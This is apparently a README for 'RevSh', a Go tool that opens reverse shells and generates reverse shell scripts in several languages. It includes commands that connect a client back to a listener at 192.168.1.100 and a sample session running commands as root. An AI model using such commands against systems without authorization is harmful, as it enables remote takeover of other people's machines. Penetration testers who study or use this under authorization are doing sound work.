
# RevSh - Reverse Shell

RevSh is a simple reverse shell tool written in Go. It allows you to establish a reverse shell connection between a client and a server, enabling the server to execute commands on the client system. This project also includes functionality to generate reverse shell scripts in various programming languages.

## Features

- **Reverse Shell**: A basic reverse shell that allows a server to execute commands on the client machine.
- **Cross-Platform Support**: The reverse shell works on both Windows and Unix-based systems (Linux/macOS).
- **Script Generation**: Generates reverse shell scripts in multiple languages:
  - PHP
  - Bash
  - Python
  - C#
  - Java

## Usage

### Running the Reverse Shell

You can run RevSh in two modes:
1. **Server Mode**: The server listens for incoming connections from a client.
2. **Client Mode**: The client connects to a server and waits for commands.

### Flags

- `-l`: Run in server mode and listen for incoming reverse shell connections.
- `-r`: Run in reverse shell mode as the client, connecting to the server.
- `-g`: Generate reverse shell scripts in different languages.
- `-p`: Specify the port for communication (default: `9999`).
- `-h`: Specify the server IP address (only used in client mode).

### Examples

#### 1. Running in Server Mode

To start the server, listening for reverse shell connections on port 9999:

```bash
go run main.go -l -p 9999
```

#### 2. Running in Client Mode

To run the client and connect to the server (e.g., 192.168.1.100) on port 9999:

```bash
go run main.go -r -h 192.168.1.100 -p 9999
```

#### 3. Generating Reverse Shell Scripts

To generate a reverse shell script in Bash for a target with IP `192.168.1.100` on port `9999`:

```bash
go run main.go -g -lang bash -h 192.168.1.100 -p 9999
```

Supported languages for script generation:
- `php`
- `bash`
- `python`
- `c#`
- `java`

### Usage Example

#### Server Side:

```bash
$ go run main.go -l -p 9999
Server listening on port 9999...
Client connected: 192.168.1.101:12345
Shell> whoami
root
Shell> ls
file1.txt
file2.txt
```

#### Client Side:

```bash
$ go run main.go -r -h 192.168.1.100 -p 9999
Connected to server 192.168.1.100:9999
```

### Exit the Shell

To exit the reverse shell, type `exit` in the server terminal:

```bash
Shell> exit
```

## How It Works

### Server

- The server listens for incoming connections on the specified port.
- Once connected, the server can send commands to the client.
- The client executes the command and returns the result to the server.

### Client

- The client connects to the server's IP and port, awaiting commands.
- When a command is received, the client executes the command on the local system and sends back the output.

## Supported Platforms

- **Windows**
- **Linux**
- **macOS**

## Reverse Shell Script Generation

RevSh can generate reverse shell scripts in various languages. You can use these scripts to trigger reverse shell connections from a remote machine to your server.

## Security Warning

This tool is meant for educational purposes or authorized penetration testing only. Misuse of this tool may lead to legal consequences. Ensure you have proper authorization before using RevSh on any system or network.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
